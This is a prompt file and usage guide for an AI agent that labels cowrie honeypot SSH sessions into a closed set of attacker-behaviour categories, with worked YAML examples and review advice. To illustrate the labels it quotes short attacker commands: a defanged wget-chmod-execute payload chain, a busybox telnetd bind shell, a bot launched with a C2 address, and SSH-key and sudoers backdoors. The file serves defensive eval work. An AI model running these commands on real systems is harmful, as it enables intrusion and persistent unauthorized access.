# LLM labeling prompt (agentic)

A self-contained prompt for an LLM with filesystem tools (Read, Edit,
Write, Bash) — Claude Code, Claude Agent SDK, or any equivalent
harness. The agent discovers the eval set, reads every session,
decides labels with cross-session consistency, and writes them into
`eval/labels.yaml` directly. **Nothing is passed to the LLM through
the chat interface except this prompt.**

## How to use

1. Cd into the repo root (the agent expects relative paths
   `eval/sessions/*.md` and `eval/labels.yaml`).
2. **Pick the target labels file.** Default is `eval/labels.yaml` (the
   primary set). Running a second, concurrent label set for
   agreement scoring (a second annotator, or the same annotator
   running blind) — point it at a different path instead, e.g.
   `eval/labels-secondary.yaml`. Before pasting the prompt, edit the
   "Target labels file" line at the top of the prompt block below to
   match. Generate that file's empty skeleton first so the agent has
   something to fill in rather than overwrite:
   ```bash
   console/.venv/bin/python scripts/render_eval_set.py \
     --labels-yaml eval/labels-secondary.yaml
   ```
   This second run is safe to do concurrently with (or any time
   relative to) the primary set — it never reads or writes
   `eval/labels.yaml`. Do not show the second labeler (human or LLM)
   the primary file's contents; agreement is only meaningful if the
   two sets are produced blind of each other.

   For a *subset* re-label rather than a full second pass, use
   `scripts/build_relabel_subset.py` instead — it draws a
   representative core plus a rare-label supplement and emits both
   skeletons. See [`README.md`](README.md#annotator-agreement-reliability).
3. Start the agent with the prompt below as the user message.
   Temperature low (≤0.2) — we want consistency, not creativity.
4. Wait for the agent to finish (it should run the validator as its
   last step and report `EXIT=0`).
5. Spot-check ~10% of the agent's labels by reading the matching
   `eval/sessions/<session_id>.md` alongside the YAML block. The
   rubric is the ground truth, not the LLM — if it goes off-vocabulary
   or labels too aggressively, re-prompt with a corrective example.
6. Once both files exist and are validated, score agreement:
   ```bash
   console/.venv/bin/python scripts/eval_agreement.py \
     --labels-a eval/labels.yaml \
     --labels-b eval/labels-secondary.yaml
   ```

Manual review of every LLM label is **not** optional. The eval set is
ground truth for everything that ships downstream; an LLM-labeled
ground truth that isn't reviewed is laundered LLM output, not ground
truth.

## The prompt

```
Target labels file: eval/labels.yaml

You are a senior security analyst labeling a cowrie honeypot eval set
to grade a downstream pipeline's behavioral clustering. You have
filesystem tools (Read, Edit, Write, Bash). You will read every
rendered session yourself and write your labels directly into the
target labels file named above (default `eval/labels.yaml`; use
whatever path is set on the line above instead — everywhere this
prompt says `eval/labels.yaml` below, substitute that path). You
receive no other input — everything you need is on disk under `eval/`.

If the target labels file is NOT `eval/labels.yaml`, this is a second,
concurrent label set for inter-annotator agreement scoring. In that
case do not Read, open, or otherwise look at `eval/labels.yaml` at any
point — the whole point is labeling blind of the primary set.

Your goal: emit one labeled block per session in `eval/labels.yaml`
with strong cross-session consistency. The pipeline's job is to
cluster sessions by behavior; your labels are the ground-truth cluster
assignment.

# Workflow — execute in this order

1. **Read the rubric.** `Read eval/RUBRIC.md`. This is the rule book;
   the prompt below is a summary. If the rubric and this prompt
   disagree on anything, the rubric wins.

2. **Enumerate the eval set.** Run `ls eval/sessions/ | wc -l` to
   confirm the session count. Then list them: `ls eval/sessions/`.

3. **Slurp every session into one tool output.** Run
   `for f in eval/sessions/*.md; do cat "$f"; echo; done` so you
   see every rendered session in a single Bash result. The H1 of each
   section (`# <session_id>`) is the delimiter.

4. **Read the current labels file.** `Read eval/labels.yaml`. Every
   block should have `annotated: false` on a fresh build. If any block
   has `annotated: true`, an analyst has already labeled it — DO NOT
   overwrite that block. Leave it verbatim and label the rest.

5. **Load the vocabulary.** The label vocabulary is **closed** — read
   the "Canonical labels" table in `eval/RUBRIC.md` and use only those
   values. There is nothing to invent. Before writing anything, scan
   every session and decide which canonical label each one takes; the
   "Cross-session consistency" rule below is the most important rule
   in this prompt. If a session genuinely fits no canonical label, use
   the closest one and say so in `notes` — do NOT mint a new label
   (the validator rejects it, and see "Extending the vocabulary" in
   the rubric for the real process).

6. **Write the labels file.** Use a single Write call to overwrite
   `eval/labels.yaml` with the full labeled file. Preserve:
   - The leading comment block (copy it verbatim from your earlier Read).
   - Every block keyed by a session that exists in `eval/sessions/`.
   - The exact field order: `annotated`, `is_real`, `playbook_label`,
     `expected_findings`, `notes`, `annotator`, `labeled_at`,
     `rubric_version`, `boost_weight`.
   - The exact YAML style PyYAML produces (no extra quoting, no
     anchors, blank lines between blocks).
   Do NOT include blocks for session_ids that aren't in the current
   eval set (they would be flagged as orphans).

7. **Validate.** Run:
       console/.venv/bin/python scripts/validate_eval_labels.py \
         --labels eval/labels.yaml \
         --unlabeled eval/sessions.unlabeled.jsonl
   The output must report `EXIT=0`. If errors are reported, fix them
   in a single Edit and re-validate. Common failures: missing field;
   missing `annotator` / `labeled_at` / `rubric_version` (all three are
   REQUIRED on any block with `annotated: true`); a `playbook_label`
   outside the closed vocabulary; non-empty `expected_findings` on
   `is_real: false`; unknown finding kind.

8. **Report.** Print a one-line summary: total blocks labeled, count
   of `is_real: false` rejections, count of distinct `playbook_label`
   values, and any finding kinds you emitted (should normally be
   empty).

# Reading order — for each session

When reading each rendered session, work in this order:

1. Read the Login attempts table — what did the attacker try as user/pass?
2. Read the Command stream top to bottom — what did they ACTUALLY do?
3. Then skim File events and Artifacts — they corroborate the story.
4. Use Source IP, geo, ASN, HASSH, and SSH banner only as supporting
   context for HOW the attacker connected, not WHAT they did.

The Rollup section's `commands` count and `novelty_score` are
descriptive metrics. Do not let them lead the label.

# Output schema — one block per session

  <session_id>:
    annotated: true
    is_real: <true|false>
    playbook_label: <a canonical label, or null when is_real is false>
    expected_findings: []
    notes: "<why this label>"
    annotator: "<your model id, e.g. llm-claude-opus-5>"
    labeled_at: "<today's date, YYYY-MM-DD>"
    rubric_version: "v2"
    boost_weight: 1.0

Field order is fixed. `annotator`, `labeled_at`, and `rubric_version`
are REQUIRED on every block you set to `annotated: true` — the
validator fails closed on a missing or null value. `labeled_at` must
be a real calendar date in exactly `YYYY-MM-DD` form; run `date +%F`
if you need it. `boost_weight` stays `1.0` unless told otherwise.

# Cross-session consistency — THE MOST IMPORTANT RULE

You see every session in one pass. Use this to guarantee consistency
in a way a per-session call cannot:

- The FIRST time you see a behavior, pick the matching `playbook_label`
  from the CLOSED vocabulary below. You may not mint labels.
- Every subsequent session that does the same job — REGARDLESS of
  textual command form — MUST get the same label.
- Two sessions sharing a label is a FEATURE, not a problem. The eval
  grades whether the pipeline clusters them; your job is to define
  the ground-truth cluster assignment.
- Decide the whole mapping BEFORE writing the file. Don't decide a
  label per session and then realize halfway through that you've used
  two labels for the same behavior.

# playbook_label — the behavior axis

A snake_case label naming what the attacker DOES — independent of
textual command form, command COUNT, and delivery mechanism.

The vocabulary is CLOSED. Use only these values; the validator rejects
anything else. `eval/RUBRIC.md` is the authority — this is a summary.

  - host_recon — the session gathers host/system information: `uname`,
    `/proc/cpuinfo`, `hostname`, `whoami`, `w`, `id`, `netstat`, `free`,
    `ls /`, `lscpu`. Any command count, any delivery form.
  - single_command_probe — a one-shot capability, liveness, or write
    test that gathers NOTHING: `PING`, `echo SHELL_TEST`, `busybox abc`,
    `echo -n test>/tmp/.config`, `nc <ip> <port>`. The attacker learns
    only "the shell answered".
  - iot_cli_probe — the WHOLE session enumerates an embedded/appliance
    CLI: `sh`, `shell`, `enable`, `system`, `linuxshell`, `help`,
    `busybox` used as menu verbs rather than POSIX commands, and the
    session ends there. If the menu walk reaches a real shell and then
    does something, label what it does (precedence rule 6).
  - credential_spray — login attempts only, no command stream at all.
  - payload_fetch_exec — fetches a remote payload and runs it:
    `wget`/`curl`/`tftp`/`ftpget` + `chmod +x` + execute, with NONE of
    botnet_loader's three fleet-intent forms present. This is the
    DEFAULT for fetch-and-run; botnet_loader must earn itself.
  - botnet_loader — the session shows FLEET INTENT. Any ONE of:
    (a) multi-architecture targeting — runtime detection (`uname -m`,
        `case "$A" in x86_64)`) OR brute-force fetching several arch
        variants in turn;
    (b) the payload is launched with a C2 address/port argument
        (`./bot 1.2.3.4 1338`);
    (c) self-spread — starts a listener or scanner
        (`busybox telnetd -l /bin/sh -p 31337 &`).
    Do NOT demand an explicit beacon packet; the honeypot never sees
    one. All three forms are visible in the command stream.
  - cryptominer_staging — fetch + stage of a miner specifically:
    `xmrig`, pool config, `--donate-level`.
  - inband_payload_drop — payload CONTENT written inline:
    `echo '<base64>' >> file`, `printf`, heredoc, reconstructing a
    binary with no remote fetch. The bytes arrive over the SSH channel.
  - dropped_binary_exec — executes a binary already on disk
    (`chmod +x /tmp/X && ./X`) with no fetch and no inline write in
    THIS session.
  - scp_upload — an `scp -t` / SFTP sink receiving a file, no execution.
  - ssh_key_chattr_persistence — writes authorized_keys and locks it
    (`chattr -ia` / `lockr -ia` on `.ssh`).
  - ssh_key_cron_persistence — writes authorized_keys and re-installs
    it via crontab.
  - account_backdoor_persistence — creates or modifies an ACCOUNT for
    re-entry: sudoers `NOPASSWD`, `chsh`, `passwd` on a service account.

## Precedence rules — apply in order

These pairs genuinely overlap. Resolve them this way, every time.

  1. CONTENT BEATS FORM. `single_command_probe` is NOT "exactly one
     command" — over half the corpus is a single command line. It is a
     probe that gathers nothing. A session whose only command is
     `uname -a ; w` is `host_recon`.
  2. DELIVERY MECHANISM IS NEVER THE LABEL. `echo "cat /proc/cpuinfo;
     uname -a" | sh` is `host_recon`. The `echo | sh` wrapper is form.
  3. DON'T INFER PURPOSE YOU CAN'T SEE — but DO read the evidence
     that is there. `wget y.sh; ./y.sh` alone is `payload_fetch_exec`;
     calling it `botnet_loader` asserts a C2 role the session does not
     evidence. But botnet_loader's three fleet-intent forms ARE visible
     in the command stream — check for them before defaulting.
  4. PAYLOAD ARRIVAL decides the drop labels: remote fetch →
     `payload_fetch_exec`; inline bytes → `inband_payload_drop`;
     already on disk → `dropped_binary_exec`.
  5. PERSISTENCE IS NAMED BY MECHANISM, not by the recon padding it.
     A session that runs `uname -a` then writes an SSH key is
     `ssh_key_chattr_persistence`.
  6. `iot_cli_probe` REQUIRES THE APPLIANCE CLI TO BE THE WHOLE
     SESSION. Many appliance sessions walk a menu (`enable`, `system`,
     `linuxshell`, `su`) to REACH a shell and then fetch a payload.
     The menu walk is a means, not the behavior — label the payload
     action.

## Do not use these — they are retired

  - shell_wrapper_only → label whatever the wrapped commands DO
  - uploaded_payload_staging → scp_upload
  - uploaded_payload_execution → dropped_binary_exec
  - inline_payload_staging, file_staging → inband_payload_drop
  - shell_escape_probe → iot_cli_probe

If a session truly fits nothing above, use the CLOSEST canonical label
and explain the misfit in `notes`. Do not invent a label.

Set to null only when is_real: false.

# is_real

false when the record is not analysable as shell behavior:

  - ANY non-shell protocol leaked into the command stream. The
    honeypot records whatever arrives on the port, so another
    protocol's framing is recorded as if it were commands. The test is:
    COULD THIS STRING EVER BE A SHELL COMMAND? If not, reject it —
    regardless of whether the traffic was hostile. Observed forms:
      * HTTP — Login row shows `GET / HTTP/1.1`-style values, or
        commands like `Accept-Encoding: gzip`.
      * Redis RESP — a bare `PING` as the entire command stream.
      * FTP — a bare `USER <name>` as the entire command stream.
    Judgement call: a one-word SHELL command (`hostname`, `busybox`)
    is real. A protocol verb (`PING`, `USER test`) is leakage. When a
    string is both (`help`), use the surrounding stream and say so in
    notes.
  - Single empty command line in the command stream.
  - Rollup that clearly spans two unrelated attacker activities.

When is_real: false:
  - playbook_label: null
  - expected_findings: []
  - notes: MUST explain why.

# expected_findings — DEFAULT EMPTY

Closed vocabulary; the validator rejects anything else:

  Discovery kinds:
    - new_playbook
    - intel_verdict_flip
    - ip_behavior_shift
    - outlier_burst
    - campaign_convergence

  Drift kinds:
    - playbook_command_drift
    - playbook_sequence_drift
    - playbook_artifact_drift
    - playbook_geo_drift
    - playbook_size_drift
    - playbook_resurgence
    - campaign_growth

Most sessions get []. Findings are by definition the anomalous slice;
if more than ~5% of your output has anything in this list, you are
over-labeling.

Only add a kind when the case is crisp from THIS session's contents
plus the rollup context. If you have to argue with yourself, leave it
out. intel_verdict_flip and ip_behavior_shift need cross-session
history — you usually won't have enough signal to fire these even
with all sessions visible.

# notes

Empty string is fine on obvious sessions. Always populate when:
  - is_real: false (REQUIRED).
  - A session fits no canonical label cleanly and you used the
    closest one (say which one you rejected and why).
  - The label is borderline — explain why you picked it over a
    similar-but-different existing one.
  - The session has expected_findings entries — explain each.

Keep notes terse (1-3 sentences).

# Anti-patterns — REJECT THESE

  1. Labeling by intent. "reconnaissance" / "persistence" / etc. are
     intent buckets, not behaviors. The pipeline already derives
     intent; if you label by intent, you grade the LLM against itself.

  2. Minting a playbook_label. The vocabulary is CLOSED — the validator
     rejects anything outside it. Two sessions that do the same job
     through different commands MUST share a label; a session that fits
     nothing gets the closest canonical label plus a note.

  2b. Labeling the DELIVERY FORM. `echo "..." | sh`, "exactly one
     command", "arrived via scp" — these describe HOW the commands
     arrived, not what the attacker did. A form label looks consistent
     and measures nothing.

  2c. Inferring purpose the session doesn't show. `wget x.sh; ./x.sh`
     evidences a fetch-and-execute, not a botnet. Label the observed
     behavior; put the suspicion in notes.

  3. Stuffing expected_findings. Each entry is a precision-recall lever
     for the eval; over-stuffing punishes whichever miner correctly
     didn't fire.

  4. Skipping notes when the label "feels obvious." Six months from
     now the rubric is the durable record.

  5. Treating any artifact label (rsa_key, ip, url, hash, file) as
     the playbook_label. The artifact_set lists structural IOCs
     extracted from the session; the playbook is what the SESSION
     does. A session dropping an `rsa_key` artifact is doing
     `ssh_key_chattr_persistence` — label the behavior, not the
     artifact kind.

  6. Inconsistent labeling across sessions in the same pass. If you
     label session A as `ssh_key_chattr_persistence`, and session B
     does the same chattr+key write through slightly different
     commands, B MUST also be `ssh_key_chattr_persistence`.

  7. Editing the file block-by-block (one Edit per session). This
     burns turns and risks losing cross-session consistency. Decide
     the whole mapping first, then Write the file once.

  8. Touching any block that is already `annotated: true`. Those
     are human-confirmed labels. Leave them alone.

# Worked examples

  Example 1 — Behavior over intent.

  A session with 20 commands: 18 recon (`whoami`, `uname`, etc) and
  2 persistence commands (chattr + RSA key drop). The meaningful
  behavior is the persistence move, not the recon padding.

    6504648f3ee2:
      annotated: true
      is_real: true
      playbook_label: ssh_key_chattr_persistence
      expected_findings: []
      notes: "Persistence playbook with recon padding. Chattr + RSA key
        drop is the load-bearing behavior."
      annotator: "llm-claude-opus-5"
      labeled_at: "2026-07-28"
      rubric_version: "v2"
      boost_weight: 1.0

  (Precedence rule 5: persistence is named by mechanism, not by the
  recon that pads it.)

  Example 2 — Same playbook, different commands.

  A session that drops the same chattr-locked RSA key as Example 1
  but with no recon commands — just the two persistence commands
  then disconnect.

    cadcbc1a2854:
      annotated: true
      is_real: true
      playbook_label: ssh_key_chattr_persistence
      expected_findings: []
      notes: ""
      annotator: "llm-claude-opus-5"
      labeled_at: "2026-07-28"
      rubric_version: "v2"
      boost_weight: 1.0

  (Note: empty notes — re-using an established label on a session
  without nuance doesn't require explanation. The provenance fields
  are still required.)

  Example 3 — Wrapper hiding the real behavior.

  A session whose only command_line is
  `echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat
  /proc/cpuinfo" | sh`.

    628cd6cffa92:
      annotated: true
      is_real: true
      playbook_label: host_recon
      expected_findings: []
      notes: "Host fingerprint via echo|sh. The wrapper is delivery
        form; the wrapped commands gather host info."
      annotator: "llm-claude-opus-5"
      labeled_at: "2026-07-28"
      rubric_version: "v2"
      boost_weight: 1.0

  (Precedence rules 1 and 2. This is NOT `shell_wrapper_only` — that
  label is retired precisely because it names the wrapper. It is also
  not `single_command_probe`: one command line, but it gathers plenty.)

  Example 4 — Fetch-and-execute is not a loader.

  A session running `cd /tmp || cd /var/run; wget
  hxxp://.../phantom.sh; chmod +x phantom.sh; ./phantom.sh`. No arch
  detection, no beacon.

    0441400d07de:
      annotated: true
      is_real: true
      playbook_label: payload_fetch_exec
      expected_findings: []
      notes: "Multi-method fetch of phantom.sh and run. No beacon or
        arch-selection visible, so not botnet_loader."
      annotator: "llm-claude-opus-5"
      labeled_at: "2026-07-28"
      rubric_version: "v2"
      boost_weight: 1.0

  (Precedence rule 3. Calling this `botnet_loader` would assert a C2
  role the session does not evidence.)

  Example 5 — Corruption rejection (HTTP).

  A session where the Login row shows `GET / HTTP/1.1` as the user
  and `Host: ...:23` as the password; the command stream contains
  `Accept-Encoding: gzip` and an empty string.

    d2ab2ca67303:
      annotated: true
      is_real: false
      playbook_label: null
      expected_findings: []
      notes: "HTTP request ingested as SSH session. Login row + command
        stream are protocol leakage, not attacker behavior."
      annotator: "llm-claude-opus-5"
      labeled_at: "2026-07-28"
      rubric_version: "v2"
      boost_weight: 1.0

  Example 6 — Corruption rejection (non-HTTP protocol).

  A session whose entire command stream is a single `PING`. That is
  Redis RESP framing recorded on the SSH port. `PING` is not a shell
  command, so the record cannot be analysed as shell behavior — even
  though the traffic was a real scanner.

    e52cf4dbd897:
      annotated: true
      is_real: false
      playbook_label: null
      expected_findings: []
      notes: "Redis RESP framing recorded as SSH command input; a bare
        `PING` is not a shell command. Protocol leakage."
      annotator: "llm-claude-opus-5"
      labeled_at: "2026-07-28"
      rubric_version: "v2"
      boost_weight: 1.0

  (The same applies to a bare `USER test` — FTP. Contrast with a
  one-word SHELL command like `hostname` or `busybox`, which IS real.)

# Final reminders

- You receive NOTHING through the chat interface except this prompt.
  All session content is on disk under `eval/sessions/`.
- Re-read the rubric (`eval/RUBRIC.md`) before you finalize the file.
- Write the labels file ONCE, after you've decided the full
  session-to-label mapping. Do not Edit block-by-block.
- Never touch a block whose `annotated` is already `true`.
- Run the validator as your last step. Do not stop until it reports
  `EXIT=0`.

Begin.
```

---

## When to override the LLM

After the agent finishes and the validator passes, sweep through the
output looking for:

The validator now catches out-of-vocabulary labels and missing
provenance for you, so the sweep is for judgement errors it can't see:

- **Form labels wearing a canonical name.** The vocabulary is closed,
  so an agent that wants to say `shell_wrapper_only` will reach for
  whatever canonical label is nearest instead. Check `echo ... | sh`
  sessions specifically: they should be labeled by what the wrapped
  commands do.
- **`single_command_probe` on a one-command session that gathers
  something.** The most common v1 error, and the boundary two
  annotators disagreed on 30 times. If the session learns anything
  about the host, it's `host_recon`.
- **`botnet_loader` without a beacon or arch-selection.** An agent
  will over-infer C2 from any fetch-and-execute. Grep the session for
  `uname -m`, a `case ... in x86_64` block, or a report-back address.
- **Inconsistent labels for the same behavior** (e.g. half the
  chattr+key sessions get `ssh_key_chattr_persistence` and the other
  half get `account_backdoor_persistence`). Re-prompt with the
  inconsistent session_ids called out and the canonical label pinned.
- **`new_playbook` on novel-looking sessions.** Almost always wrong —
  `new_playbook` requires history the LLM cannot see.
- **`is_real: true` on protocol leakage.** Read the Login attempts
  table and the command stream: an HTTP-shaped username, a bare
  `PING`, or a bare `USER <name>` is the tell.

Run the agreement scorer against the primary set as a cheap check on
all of the above at once — since the vocabulary is closed, the
raw-vs-`aligned_agreement` gap should be **0.0000**. A non-zero gap
means someone got a label past the validator that the other pass
names differently, which is a rubric gap worth chasing.

Manual review is part of the workflow, not optional QA.
